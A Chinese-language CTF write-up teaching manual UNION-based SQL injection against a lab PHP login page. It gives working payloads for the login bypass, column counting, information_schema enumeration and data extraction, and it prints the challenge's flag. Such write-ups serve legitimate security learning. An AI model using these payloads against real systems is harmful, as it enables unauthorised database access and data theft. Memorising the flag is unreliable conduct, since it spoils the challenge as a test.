---
title: "SQL 注入 · 联合查询手工注入 题解"
date: 2026-11-08
pinned: false
description: "GET 型字符注入 + 联合查询"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-13-claude.jpg
---

# SQL 注入 · 联合查询手工注入 Writeup

| 项目 | 内容 |
|---|---|
| 地址 | `2928264e5300bd0f2cf6d296.http-ctf2.dasctf.com` |
| 环境 | openresty + PHP/7.3.11 + MariaDB |
| 入口 | `check.php`，GET 参数 `username` / `password` |
| 注入点 | `username`（单引号字符型） |
| 防护 | 无 WAF、无过滤 |
| 特征 | **报错回显 + 双回显位** |
| 手法 | 联合查询注入（UNION）+ information_schema 枚举 |
| Flag | `CTF2{2d3b2d96-913f-44ec-9169-5032badf1f79}` |
| 解题日期 | 2026-11-06 |

> 首页提示：「用 sqlmap 是没有灵魂的」—— 出题人明确要求手工注入。

---

## 一、侦察：从登录框到报错回显

### 1.1 页面结构

```html
<form action="check.php" method="GET">
    <input type="text" name="username" />
    <input type="text" name="password" />
</form>
```

GET 提交，两个参数，PHP 后端。

### 1.2 三个关键现象

| 请求 | 返回 | 推出 |
|---|---|---|
| `username=admin&password=admin` | `NO,Wrong username password！！！` | 正常路径只有「成功/失败」两态 |
| `username=admin'&password=admin` | `You have an error in your SQL syntax ... near 'admin'' at line 1` | **报错回显** + **单引号字符型注入** |
| `username=admin' or 1=1#` | `Login Success! Hello admin！Your password is '...'` | 查询结果**回显到页面** |

三条结论：

| # | 结论 | 意义 |
|---|---|---|
| 1 | 字符型注入，单引号闭合 | 决定 payload 长什么样 |
| 2 | 数据库报错直接吐到页面 | **不用盲注**，报错本身就是通道 |
| 3 | 查询结果会渲染到页面 | **可以用 UNION**，不用逐字猜 |

第 2、3 条是这个题的分水岭：有回显 → 走联合查询，最快。

---

## 二、原理：单引号为什么能逃逸

### 2.1 后端的代码形状

根据报错信息反推，后端大致是：

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

注意模板里那对引号：`username='` 开一个，`'` 关一个。用户输入被夹在中间。

```
WHERE username='  [用户输入]  ' AND password='x'
                ↑ 开          ↑ 关
```

### 2.2 核心概念：数据区 vs 代码区

| 区域 | 说明 | 里面写的字 |
|---|---|---|
| **数据区**（字符串内部） | 被引号包住的部分 | 全是普通字符，数据库不当代码 |
| **代码区**（语法层） | 引号外面的部分 | 才会被解析成 SQL 关键字 |

**单引号的作用，就是把用户从数据区「放」到代码区。**

### 2.3 三种输入的对比

**① 传 `1`**

```sql
WHERE username='1' AND password='x'
```

`1` 被当作字符串内容，去和不存在的用户比较 → 查不到。

**② 传 `1'`（只闭合，不做事）**

```sql
WHERE username='1'' AND password='x'
```

`'1'` 是一个完整字符串，后面的 `' AND password='x'` 语法错乱 → 报错 `near '1''`。

**③ 传 `1' union select 1,2,3#`**

```sql
WHERE username='1' union select 1,2,3#' AND password='x'
              └字符串┘└── 我的 SQL ──┘└── 被注释 ──┘
```

- `'1'` 闭合，回到代码区
- `union select 1,2,3` 被当作真正的 SQL 语句执行
- `#` 把模板剩下的 `' AND password='x'` 整段吃掉

### 2.4 为什么 `#` 不能省

模板尾部还留着一个孤立的 `'`（原本关闭 password 的那个）。如果不注释：

```sql
WHERE username='1' union select 1,2,3' AND password='x'
                                    ↑ 这个引号没有配对
```

语法直接崩。

所以完整 payload 必须同时具备三个部分：

| 部分 | 作用 |
|---|---|
| `1'` | 闭合，进入代码区 |
| `union select ...` | 我的查询 |
| `#` | 注释掉模板残留 |

### 2.5 报错信息里的两个引号是证据

```
... near 'admin'' at line 1
```

| 引号 | 来源 |
|---|---|
| 第一个 `'` | 你输入的 `admin'` 里的 |
| 第二个 `'` | 模板里本来就有的关闭引号 |

它们挨在一起，说明你的输入**被原样拼进了单引号内部**。这条报错等于把后端代码的形状直接告诉了你。

---

## 三、登录绕过：能做，但不是终点

### 3.1 最干净的写法

```sql
username: admin' or 1=1#
password: 任意
```

拼接后：

```sql
WHERE username='admin' or 1=1#' AND password='x'
```

`or 1=1` 恒真 → 返回第一条记录。

### 3.2 AND 优先级陷阱（重要）

`' OR '1'='1` 这个经典 payload **在这题不一定成立**，原因在于 SQL 的运算符优先级：

```
AND  >  OR
```

不带 `#` 时，拼接结果是：

```sql
WHERE username='' OR '1'='1' AND password='8729...'
```

按优先级实际等价于：

```sql
WHERE username='' OR ('1'='1' AND password='8729...')
                 └─ 假 ─┘ └── 需要 password 也匹配 ──┘
```

所以：

| 写法 | 是否成立 | 原因 |
|---|---|---|
| `' or 1=1#` | ✅ | `#` 注释掉 password 条件，`or 1=1` 独立恒真 |
| `admin' or '1'='1` | ⚠️ 看情况 | 只有 `username='admin'` 本身为真时才成立（因为 OR 左边为真，整体就真） |
| `' or '1'='1` | ❌ 通常失败 | `username=''` 为假，右边又要 password 匹配 |

**结论：`#` 比 `'1'='1` 更可靠。** 别背那个经典 payload，理解优先级。

### 3.3 为什么这不是终点

绕过登录后页面显示：

```
Login Success!
Hello admin！
Your password is '872946ce8c6c42abf633001c95fd8677'
```

`872946ce8c6c42abf633001c95fd8677` 是 **32 位十六进制 = MD5**，是 admin 的密码哈希，**不是 flag**。

而且大概率不可逆 —— 出题人不会把 flag 做成可反查的 MD5。

**真正的收获是：页面有三个回显位置。**

| 位置 | 页面上 | 能塞什么 |
|---|---|---|
| 1 | `Login Success!` | 布尔信号 |
| 2 | `Hello xxx！` | 一个字段值 |
| 3 | `Your password is 'xxx'` | 一个字段值 |

有回显位 = 可以用 UNION 一次带出数据，不用逐字盲注。

---

## 四、字段数与回显位

### 4.1 先数格子：`order by`

UNION 要求两边**列数一致**，所以必须先知道原查询有几列。

```
username=1' order by 3#     → 正常返回
username=1' order by 4#     → Unknown column '4' in 'order clause'
```

| 结果 | 含义 |
|---|---|
| 正常返回 | 列数 ≥ N |
| `Unknown column 'N'` | 列数 < N |

**列数 = 第一个报错的 N 减 1 → 本题 3 列。**

### 4.2 回显位的概念：格子

一条 SELECT 就是一排格子，位置决定内容显示在哪：

```sql
SELECT  id ,  username ,  password  FROM users WHERE ...
       └1┘   └──2──┘    └──3──┘
```

页面模板只用了其中两个：

```php
echo "Hello ".$row['username'];                  // 取第 2 格
echo "Your password is '".$row['password']."'";  // 取第 3 格
```

第 1 格（id）页面没用，所以**永远不显示**。

### 4.3 探测：用数字当门牌号

```sql
union select 1,2,3
```

页面变成：

```
Hello 2！                    ← 第 2 格的内容
Your password is '3'         ← 第 3 格的内容
```

数字出现在页面上，就说明**那一格是可见的**。

### 4.4 为什么第 1 格永远填 1

因为第 1 格不显示，填什么都不会出现在页面上，填 `1` 只是习惯性的占位。

| 格子 | 原查询的列 | 页面显示在哪 | 探测填 | 取数填 |
|---|---|---|---|---|
| 第 1 格 | `id` | **不显示** | `1` | `1`（继续占位） |
| 第 2 格 | `username` | `Hello xxx` | `2` | `group_concat(username)` |
| 第 3 格 | `password` | `Your password is 'xxx'` | `3` | `group_concat(password)` |

### 4.5 为什么数字能换成函数

`select` 后面每格放的是**表达式**，不是「数字」：

| 表达式 | 产生的值 |
|---|---|
| `2` | 整数 2 |
| `'abc'` | 字符串 abc |
| `group_concat(username)` | 拼接后的字符串 |
| `version()` | 版本号 |

UNION 只要求「两边都是 3 个表达式」，不关心表达式是什么。数字只是最省事的占位符。

---

## 五、information_schema 三级枚举

### 5.1 三级结构

```
库 (schema)  →  表 (table)  →  列 (column)
```

`information_schema` 是 MySQL/MariaDB 自带的元数据库，里面有三张关键表：

| 系统表 | 字段 | 回答什么 |
|---|---|---|
| `information_schema.schemata` | `schema_name` | 有哪些**库** |
| `information_schema.tables` | `table_name` | 有哪些**表** |
| `information_schema.columns` | `column_name` | 有哪些**列** |

**系统表名和字段名是成对的，改一个必须改另一个。**

### 5.2 查库

```sql
union select 1,2,group_concat(schema_name) from information_schema.schemata#
```

返回：

```
information_schema,performance_schema,test,mysql,geek
```

| 库名 | 判断 |
|---|---|
| `information_schema` / `performance_schema` / `mysql` | 系统库 |
| `test` | MySQL 默认空库 |
| **`geek`** | **唯一的自定义库 ← 目标** |

首页提示「我把它们放在了**那个地方**」—— 那个地方就是 `geek`。

### 5.3 查表

```sql
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#
```

返回：

```
geekuser,l0ve1ysq1
```

| 表名 | 判断 |
|---|---|
| `geekuser` | 像用户表，可能是迷惑项 |
| **`l0ve1ysq1`** | 名字是「love1ysql」，出题人手癖 ← 优先查 |

### 5.4 查列

```sql
union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1'#
```

返回：

```
id,username,password
```

### 5.5 注意两个条件都要写

| 只写什么 | 查到什么 |
|---|---|
| 只写 `table_schema='geek'` | geek 库**所有表**的列 → `id,username,password,id,username,password`（6 个，两表各 3 列） |
| 只写 `table_name='l0ve1ysq1'` | 空（没有库叫这个名字） |
| 两个都写 | 只有目标表的 3 列 ✅ |

顺带一个结论：库里两张表结构完全一样（都是 `id,username,password`），说明 `geekuser` 是迷惑表。

---

## 六、取数据

### 6.1 `from` 换成真实表

```sql
查列:  union select 1,2,group_concat(column_name) from information_schema.columns where ...#
取数:  union select 1,2,<列名>                     from geek.l0ve1ysq1#
```

两个变化：

| 变化 | 说明 |
|---|---|
| `from` 变成 `geek.l0ve1ysq1` | 从「系统目录表」换成「真实数据表」 |
| 去掉 `where` | 已经直指目标表，不需要再过滤 |

### 6.2 全量取法（看全貌）

```sql
union select 1,2,group_concat(concat_ws(0x7c,id,username,password)) from geek.l0ve1ysq1#
```

- 内层 `concat_ws(0x7c,...)`：把一行的三列横着拼成 `1|admin|xxx`
- 外层 `group_concat`：把多行竖着拼成 `1|admin|xxx,2|user2|yyy,...`

`0x7c` 是 `|` 的十六进制，用作分隔符。

### 6.3 精确取法（拿完整 flag）

`group_concat` 有 **1024 字节上限**，18 条记录一定会被截断，而且截的是**开头**：

```
...913f-44ec-9169-5032badf1f79}     ← 只剩尾巴，前面的 CTF2{... 没了
```

所以要改用单值查询：

```sql
union select 1,2,password from geek.l0ve1ysq1 where password like 0x4354463225#
```

| 技巧 | 说明 |
|---|---|
| `0x4354463225` | `CTF2%` 的十六进制，避免引号编码麻烦 |
| 单值查询 | 不经过 `group_concat`，**不触发长度截断** |

### 6.4 最终结果

```
CTF2{2d3b2d96-913f-44ec-9169-5032badf1f79}
```

---

## 七、踩坑记录

| # | 坑 | 现象 | 原因 / 处理 |
|---|---|---|---|
| 1 | `union select` 前面漏单引号 | `NO,Wrong username password` | payload 变成整个字符串，UNION 没被解析 |
| 2 | `table_schema` 填了**表名** | `Your password is ''`（空） | schema = 库，这题只能是 `'geek'` |
| 3 | `from` 换成 columns 但 `group_concat` 还用 `table_name` | `l0ve1ysq1,l0ve1ysq1,l0ve1ysq1` | 系统表和字段必须成对改 |
| 4 | 只改 `from` 没改取值列 | 同上，重复三次 | 重复次数 = 该表的列数（所以是 3 列） |
| 5 | `database('geek')` | `near 'geek)''` | `database()` 是零参数函数，不接参数 |
| 6 | `where x=l0ve1ysq1`（无引号） | `Unknown column 'l0ve1ysq1'` | 不加引号 = 标识符（列名）；加引号 = 字符串值 |
| 7 | `group_concat` 输出被砍 | 只看到 flag 的尾巴 | 1024 字节上限，改单值查询或 `substr` 分段 |
| 8 | 页面文字重叠看不清 | 两行内容叠在一起 | CSS `position:absolute` + 深色背景图；用 `view-source` 看原始 HTML |

### 第 6 条的延伸：标识符 vs 字符串字面量

| 写法 | 数据库理解为 | 结果 |
|---|---|---|
| `l0ve1ysq1` | **列名** | 找不到 → `Unknown column` |
| `'l0ve1ysq1'` | **字符串值** | 正常比较 |
| `` `l0ve1ysq1` `` | 表名/列名（反引号） | 标识符，用于特殊名字 |

**同一个引号，在两个阶段语义完全不同：**

| 阶段 | `'` 的角色 |
|---|---|
| 拼接模板里 | **武器**，用来闭合逃逸 |
| 进入代码区后 | **标点**，字符串值必须加 |

---

## 八、HackBar 工具（可选）

### 8.1 SQLi 菜单覆盖到哪

| 菜单项 | 产出 | 层级 |
|---|---|---|
| Dump all database names | 库名 | 库 |
| Dump tables from database | 表名 | 表 |
| Dump columns from database | 列名 | 列 |
| Dump in one shot payload | 库+表+列一次出 | 仍是元数据 |
| Union select statement | 只给骨架 | 空壳 |
| Error-based injection statement | 报错注入模板 | 另一条路 |

**没有「取数据」这一项** —— 最后一步必须手写，因为变数太多（取哪表、哪列、单列还是拼接、超长怎么分段）。

### 8.2 弹窗里「两个 3」的含义

用 Dump 功能时会问两个数字：

| 输入框 | 含义 | 本题值 |
|---|---|---|
| Number of columns | 原查询有几列 | 3（`order by 4` 报错得到） |
| Output position | **哪一列**会显示在页面上 | 3（`Your password is` 是第 3 格） |

两个数字含义完全不同，本题**恰好都是 3**，所以容易误认为是同一个东西。如果换成 5 列、回显在第 2 格，就会看到 `5` 和 `2`。

### 8.3 工具的边界

| 它能帮你 | 它帮不了 |
|---|---|
| 拼 `information_schema` 长 SQL | 判断字段数是 3 不是 4 |
| 自动加闭合引号和注释 | 知道回显位是第几格 |
| 按模板填空 | 知道库名 `geek`、表名 `l0ve1ysq1` |
| — | 取数据时选哪个列 |

---

## 九、方法论

### 9.1 手注固定骨架

```
① 闭合:  1'
② 探测:  order by N          → 字段数
③ 定位:  union select 1,2,3  → 回显位
④ 枚举:  schemata → tables → columns
⑤ 取数:  from 真实表
```

每一步的产出都是下一步的输入，**跳过任何一步都会卡**：

| 跳过的步骤 | 后果 |
|---|---|
| 不测字段数 | UNION 报 `different number of columns` |
| 不测回显位 | 数据塞到不显示的格子里，页面空白 |
| 不查库名 | `where table_schema='???'` 无从下手 |
| 不加 `table_name` | 多表列名混在一起，分不清归属 |

### 9.2 记忆锚点（不用背函数名）

| 概念 | 锚点 |
|---|---|
| `group_concat` | **竖着拼**（多行压一行）；`concat` 是**横着拼**（一行多列） |
| `schema / table / column` | 库 / 表 / 列，`schema` 就是 database 的马甲 |
| 三个系统表 | 系统表名和字段名成对：`schemata→schema_name`、`tables→table_name`、`columns→column_name` |
| `1,2,3` | 门牌号，探明后换成住户 |
| `#` | 把模板尾部残留的引号吃掉 |

### 9.3 判断链条（遇到异常先问自己）

| 现象 | 先查什么 |
|---|---|
| `NO,Wrong username password` | 单引号闭合了吗？`#` 加了吗？ |
| `Unknown column 'xxx' in 'where clause'` | 值忘加引号了（被当列名） |
| `Your password is ''`（空） | 语法通了但没匹配 → 查 where 条件（schema 还是 table？） |
| 数据只出了一部分 | `group_concat` 1024 截断 → 改单值或分段 |
| 页面文字重叠 | 看 `view-source`，别信渲染结果 |

---

## 十、汇总表

| 项目 | 内容 |
|---|---|
| 题型 | GET 型字符注入 + 联合查询 |
| 后端 | `SELECT * FROM users WHERE username='$u' AND password='$p'` |
| 字段数 | 3（`order by 4` 报错） |
| 回显位 | 第 2 格（Hello）、第 3 格（password） |
| 库 | `geek` |
| 表 | `geekuser`（迷惑）、`l0ve1ysq1`（目标） |
| 列 | `id, username, password` |
| 登录绕过 | `admin' or 1=1#`（`#` 比 `'1'='1` 可靠，因为 AND 优先于 OR） |
| 查库 payload | `union select 1,2,group_concat(schema_name) from information_schema.schemata#` |
| 查表 payload | `union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#` |
| 查列 payload | `union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1'#` |
| 取数 payload | `union select 1,2,password from geek.l0ve1ysq1 where password like 0x4354463225#` |
| Flag | `CTF2{2d3b2d96-913f-44ec-9169-5032badf1f79}` |
| 核心原理 | 单引号把用户从「数据区」放进「代码区」，`#` 清掉模板残留 |
| 核心陷阱 | AND 优先级 > OR；`schema`≠`table`；系统表名与字段名成对 |
| 工具教训 | HackBar 只到列名层；页面渲染不可信，用 `view-source` |
